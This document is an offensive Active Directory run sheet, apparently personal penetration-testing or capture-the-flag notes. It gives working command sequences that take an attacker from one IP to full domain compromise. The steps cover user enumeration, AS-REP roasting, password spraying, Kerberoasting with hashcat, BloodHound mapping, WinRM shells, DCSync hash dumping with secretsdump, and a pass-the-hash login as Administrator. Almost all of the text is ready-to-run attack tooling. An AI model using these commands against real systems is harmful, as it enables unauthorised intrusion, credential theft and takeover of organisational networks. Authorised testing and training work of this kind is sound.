# Active Directory Run Sheet

One IP in, the domain out. Every step works the same way: run the block, find the line under **Look for**, go where **Then** points. Nothing is a result too — each step says where nothing sends you. A range instead of one IP starts at [[Domain-Controller-Discovery]]; a shell on a host sends that host to [[▸ Windows-Run-Sheet]].

|what you hold|step|
|---|---|
|one IP|1|
|the DC and the domain name|2|
|a list of usernames|3|
|a password or hash|4|
|a credential that logs in|5, 6|
|a credential for another host|7|
|Domain Admin|8|

> [!warning] On Kali the Impacket tools are named `impacket-<Tool>` — `impacket-GetNPUsers`, not `GetNPUsers.py`. The `.py` names exist only when Impacket was installed with pip or pipx.

> [!important] Nothing that sends a password runs before step 3's policy check. A locked-out account cannot be unlocked from your side.

---

## 1 — Ports and names

```bash
sudo nmap -Pn -p 88,135,139,389,445,464,3268 -sV -sC -oN dc-scan.txt <target ip>
```

- `-Pn` → skip the "is it up" ping. Windows often drops ping; without this flag nmap prints `Host seems down` and scans nothing.
- `-p 88,…` → the AD ports only. Seven ports finish in under a minute, and nothing here is rushed, so this is the scan to trust for the **Look for** lines below.
- `-sV -sC` → service versions and default scripts: the domain name, the clock offset (`clock-skew`) and SMB signing come from these.

```bash
sudo nmap -Pn -p- -sV -sC --min-rate 1000 -oN scan.txt <target ip>
```

- `-p-` → all 65,535 ports, for the doors outside the AD set. Without it nmap checks only the 1,000 most common.
- `--min-rate 1000` → at least 1,000 packets a second. Over a VPN (Virtual Private Network) that speed can lose replies, and nmap then reports an open port as `filtered` and leaves it out. Any port `dc-scan.txt` shows open but this scan does not is that loss — rerun without `--min-rate`, which is slower but complete.

```bash
nxc smb <target ip>
```

- prints the host name and the domain name on one line — easier than digging them out of the nmap output.

**Look for**

- `88/tcp open kerberos-sec` → this host is the DC (Domain Controller). [[Security-Terms#^kerberos|Kerberos]] runs on domain controllers and nowhere else in a domain.
- in the `nxc` line: `(name:DC01) (domain:corp.local)` → the host name and the domain name. From here on, `<dc ip>`, `DC01` and `corp.local` stand for your real values.
- nmap's `Domain: corp.local0.` → the domain is `corp.local`. The trailing `0.` is an nmap quirk; copy it and every Kerberos tool fails with an unknown-realm error.
- any port outside the AD set (80, 1433, 5985 …) → a second door; work it with its `PORT-Service` note.

**Then** — add the names:

```bash
echo '<dc ip> DC01.corp.local corp.local DC01' | sudo tee -a /etc/hosts
```

- Kerberos asks for a ticket named after a host. An IP has no name, so without this line every Kerberos step fails.

No `88` → not a DC; work the ports it does have, each through its `PORT-Service` note.

---

## 2 — Usernames, no account

```bash
nxc smb <dc ip> -u '' -p '' --users
```

- `-u '' -p ''` → empty user, empty password: a null session. Older or misconfigured domains answer it with the whole user list.
- **Look for** the names, and read the description column — passwords are sometimes left there.
- **Then** names into `users.txt`, one per line → step 3.

Refused (`STATUS_ACCESS_DENIED`) or empty:

```bash
nxc smb <dc ip> -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | grep -v '\$$' > users.txt
```

- asks "who is account number 500, 501, 1000 …" one number at a time. That is not a request for the list, so the refusal above does not cover it. The pipe writes `users.txt` for you.
- `grep -v '\$$'` → drops names ending in `$`: computer accounts, whose passwords are long and random.
- refused as `guest` → the same command with `-u '' -p ''`.

Both refused:

```bash
kerbrute userenum -d corp.local --dc <dc ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

- asks Kerberos whether each name exists, with no password, so no lockout counter moves.
- `-d` takes the domain (`corp.local`), not the host name (`DC01.corp.local`). The wrong value confirms no names at all, which looks like a bad wordlist.
- **Look for** `[+] VALID USERNAME:` → the part before `@` goes into `users.txt`.

---

## 3 — First credential

Cheapest first: shares and AS-REP roasting cost the target nothing; spraying risks lockouts.

```bash
nxc smb <dc ip> -u '' -p '' --pass-pol
```

- `Account Lockout Threshold: None` → no lockout. A number → stay below it per reset window. Unreadable → treat it as 3.

### 3a — Shares

```bash
nxc smb <dc ip> -u guest -p '' --shares
```

- **Look for** `READ` beside any share except `ADMIN$`, `C$`, `IPC$`. Refused as `guest` → `-u '' -p ''`.

```bash
smbclient //<dc ip>/<share> -N -c 'recurse on; prompt off; mget *'
```

- `-N` → no password prompt. `-c` runs three commands inside the share: walk every folder, stop asking per file, download everything. Run it from an empty folder — `mget *` drops it all where you stand.

```bash
grep -rni pass .
```

- **Look for** a password in any downloaded file → step 4.

### 3b — AS-REP roasting (Authentication Service Reply)

```bash
impacket-GetNPUsers 'corp.local/' -dc-ip <dc ip> -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
```

- the trailing `/` → marks `corp.local` as a domain with no user. Drop it and the tool reads `corp.local` as a username and stops with `Domain should be specified!`.
- **Look for** a `$krb5asrep$` line in `asrep.txt`. `doesn't have UF_DONT_REQUIRE_PREAUTH set` on every name → nothing roastable, go to 3c.
- `KDC_ERR_CLIENT_REVOKED` → that account is disabled, locked or expired. The line carries no name, but the lines follow the order of `users.txt` — read the two side by side and you know which accounts are alive before you spray.

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

- once per fresh Kali: rockyou ships compressed, and hashcat cannot read the `.gz`.

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 3c — Spraying

```bash
nxc smb <dc ip> -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

- `--no-bruteforce` → line 1 with line 1, line 2 with line 2: every user tried with their own name as password. Drop it and every name meets every password — a lockout.
- `--continue-on-success` → without it the run stops at the first hit.

```bash
nxc smb <dc ip> -u users.txt -p '<password>' --continue-on-success
```

- one password across every account, so each counter rises by one. Use a password found earlier, or a shape like `Autumn2026!`.
- **Look for** `[+] corp.local\user:password` with no `(Guest)` after it → step 4. `STATUS_PASSWORD_MUST_CHANGE` is a hit too — the password is right. `STATUS_ACCOUNT_LOCKED_OUT` → stop and wait a full reset window.

Nothing from 3a–3c → [[Authentication-Coercion]].

---

## 4 — Test the credential

```bash
nxc smb <dc ip> -u '<user>' -p '<password>'
```

- `[+]` → valid on the domain — **unless the line ends in `(Guest)`**. Then the DC did not log you in as that user at all; it handed you the built-in Guest session instead, which happens when the name does not exist or the account cannot log on (disabled). A `(Guest)` line is a miss, and `--shares` from it returns `STATUS_ACCESS_DENIED`.
- An NT hash (NT = New Technology; 32 hex characters) goes in as `-H <hash>` instead of `-p`. Anything starting `$krb5`, or shaped `user::DOMAIN:…`, cannot be passed — crack it first ([[Hash-Cracking]]).
- `KRB_AP_ERR_SKEW` from any Kerberos tool → your clock is more than five minutes off the DC's: `sudo ntpdate -u <dc ip>`. `ntpdate: command not found` → not installed by default: `sudo apt install ntpsec-ntpdate`.
- `No such file ... .ccache` from any Impacket tool → `KRB5CCNAME` still points at a ticket from an earlier target: `unset KRB5CCNAME` and retry.

```bash
nxc winrm <dc ip> -u '<user>' -p '<password>'
```

- **Look for** `(Pwn3d!)` → this user can open a remote shell:

```bash
evil-winrm -i <dc ip> -u '<user>' -p '<password>'
```

- shell → [[▸ Windows-Run-Sheet]] for this host; keep working the domain here. No `(Pwn3d!)` → WinRM is closed; try RDP next.

```bash
nxc rdp <dc ip> -u '<user>' -p '<password>'
```

- `(Pwn3d!)` → this user can open a graphical desktop over RDP (Remote Desktop Protocol): the way in when WinRM is closed, and the only way to drive a GUI-only app on the host — a password manager, an installer. Connect and work it with [[3389-RDP]]. No `(Pwn3d!)` on either → step 5.

---

## 5 — Map the domain from inside

```bash
nxc smb <dc ip> -u '<user>' -p '<password>' --shares
```

- an account often reads shares a guest could not. New `READ` → 3a's `smbclient` with `-U 'corp.local\<user>%<password>'` in place of `-N`.

```bash
bloodhound-python -u '<user>' -p '<password>' -d corp.local -ns <dc ip> -c All --zip
```

- `-ns <dc ip>` → resolve names through the DC. Without it the collector asks your own DNS (Domain Name System), which has never heard of `corp.local`, and stops with `Could not find a domain controller`.
- the collector must match the BloodHound you load into: legacy BloodHound ← `bloodhound-python`, BloodHound CE (Community Edition) ← `bloodhound-ce-python`. The two write different data formats (`version` 5 and 6), and each BloodHound expects its own.
- **Look for** any edge leaving your user or its groups: mark the user as owned, run the shortest path to Domain Admins. Details: [[BloodHound]].
- a write edge onto a **computer** (`AllowedToAct`, `GenericWrite`, `GenericAll`, `WriteDacl`, `Owns`), the DC most of all → [[RBCD]]. A `constrained`/`unconstrained` delegation flag on another account → [[Constrained-Delegation]].

---

## 6 — Kerberoast

```bash
impacket-GetUserSPNs 'corp.local/<user>:<password>' -dc-ip <dc ip> -request -outputfile tgs.txt
```

- `-request` → fetch the tickets. Without it you get the table of roastable accounts and no hash.
- **Look for** `$krb5tgs$` lines in `tgs.txt`. `No entries found!` → nothing roastable.

```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

- the mode follows the number after `$krb5tgs$`: `23` → `13100`, `18` → `19700`. Cracked → step 4 with the new credential.
- rockyou exhausted with nothing cracked is the common case, not a mistake — try `-r` rules once ([[Hash-Cracking]]), then let it go. A `constrained` delegation flag on the roasted account is a tempting but frequent dead end; the real delegation win is usually an ACL edge elsewhere ([[RBCD]], [[Constrained-Delegation]]).

---

## 7 — Another host

```bash
nxc smb <target ip> -u '<user>' -p '<password>'
```

- `[+]` alone → valid, not admin there. `(Pwn3d!)` → local admin → [[Active-Directory-Lateral-Movement]].

---

## 8 — The domain

```bash
impacket-secretsdump 'corp.local/<user>:<password>@<dc ip>' -just-dc-ntlm
```

- works only for an account with replication rights — Domain Admins, or one BloodHound shows with `DCSync`. An ordinary user logs in and is then refused, which looks like a tool bug. Details: [[DCSync]].
- **Look for** `Administrator:500:<lm>:<nt>:::` → the fourth field is the NT hash.

```bash
evil-winrm -i <dc ip> -u Administrator -H <nt hash>
```

---

Stalled? Write down everything you hold — every name, password, hash and host — and re-enter the table at the top.